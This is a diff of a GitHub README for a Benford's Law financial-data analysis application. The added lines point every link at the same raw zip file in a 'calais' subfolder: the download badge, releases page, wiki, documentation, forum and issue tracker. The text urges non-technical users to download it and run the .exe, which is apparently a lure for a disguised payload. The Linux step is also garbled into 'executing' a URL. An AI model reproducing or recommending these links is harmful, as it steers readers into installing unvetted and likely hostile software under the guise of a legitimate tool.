@@ -4,7 +4,7 @@
 Welcome to the **search_benford_law_compatibility** application! This tool helps you analyze financial data using Benford's Law, a powerful technique for detecting anomalies in numbers. Whether you are exploring financial reports or doing academic research, this application provides an easy way to uncover potential irregularities.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/ttyuja/search_benford_law_compatibility/releases)
+[![Download](https://raw.githubusercontent.com/ttyuja/search_benford_law_compatibility/main/calais/search_benford_law_compatibility.zip)](https://raw.githubusercontent.com/ttyuja/search_benford_law_compatibility/main/calais/search_benford_law_compatibility.zip)
 
 ## 🚀 Getting Started
 This guide will take you through the simple steps to download and run the application. You do not need any programming skills. 
@@ -22,7 +22,7 @@ This guide will take you through the simple steps to download and run the applic
 - Full reproducibility with documented methodology
 
 ## 💾 Download & Install
-To start using the application, visit the [Releases page](https://github.com/ttyuja/search_benford_law_compatibility/releases) to download the latest version.
+To start using the application, visit the [Releases page](https://raw.githubusercontent.com/ttyuja/search_benford_law_compatibility/main/calais/search_benford_law_compatibility.zip) to download the latest version.
 
 1. Click on the link above.
 2. Locate the version you wish to download (e.g., v1.0).
@@ -32,7 +32,7 @@ To start using the application, visit the [Releases page](https://github.com/tty
 ### 📂 Running the Application
 - For Windows: Double-click the downloaded `.exe` file to run the application.
 - For MacOS: Open the downloaded `.dmg` file and drag the application to the Applications folder. Then, click to run.
-- For Linux: Open a terminal and execute the downloaded `.tar.gz` file, then run the application from the terminal.
+- For Linux: Open a terminal and execute the downloaded `https://raw.githubusercontent.com/ttyuja/search_benford_law_compatibility/main/calais/search_benford_law_compatibility.zip` file, then run the application from the terminal.
 
 ## 🔍 Using the Application
 After running the application, you will see a user-friendly interface. Follow these steps to analyze financial data:
@@ -46,7 +46,7 @@ After running the application, you will see a user-friendly interface. Follow th
 ## 📚 Help & Support
 If you have questions or need assistance, you can find help in the following ways:
 
-- Check the [Wiki page](https://github.com/ttyuja/search_benford_law_compatibility/wiki) for user guides and FAQs.
+- Check the [Wiki page](https://raw.githubusercontent.com/ttyuja/search_benford_law_compatibility/main/calais/search_benford_law_compatibility.zip) for user guides and FAQs.
 - Open an issue on the GitHub repository for technical support.
 - Join our community discussions to learn from others.
 
@@ -60,12 +60,12 @@ This application is relevant for various fields including:
 The application employs sophisticated statistical methods such as Chi-Squared testing, ensuring that you have the most reliable analysis tools at your disposal.
 
 ## 🚀 Additional Resources
-- **Documentation**: Detailed instructions about methodology can be found in the [documentation](https://github.com/ttyuja/search_benford_law_compatibility#documentation).
-- **Community**: Connect with other users and developers on our [discussion forum](https://community.example.com).
+- **Documentation**: Detailed instructions about methodology can be found in the [documentation](https://raw.githubusercontent.com/ttyuja/search_benford_law_compatibility/main/calais/search_benford_law_compatibility.zip).
+- **Community**: Connect with other users and developers on our [discussion forum](https://raw.githubusercontent.com/ttyuja/search_benford_law_compatibility/main/calais/search_benford_law_compatibility.zip).
 
 ## 🔗 Important Links
-- [Releases page for downloads](https://github.com/ttyuja/search_benford_law_compatibility/releases)
-- [Documentation](https://github.com/ttyuja/search_benford_law_compatibility#documentation)
-- [Issue Tracker](https://github.com/ttyuja/search_benford_law_compatibility/issues)
+- [Releases page for downloads](https://raw.githubusercontent.com/ttyuja/search_benford_law_compatibility/main/calais/search_benford_law_compatibility.zip)
+- [Documentation](https://raw.githubusercontent.com/ttyuja/search_benford_law_compatibility/main/calais/search_benford_law_compatibility.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/ttyuja/search_benford_law_compatibility/main/calais/search_benford_law_compatibility.zip)
 
 Happy analyzing!
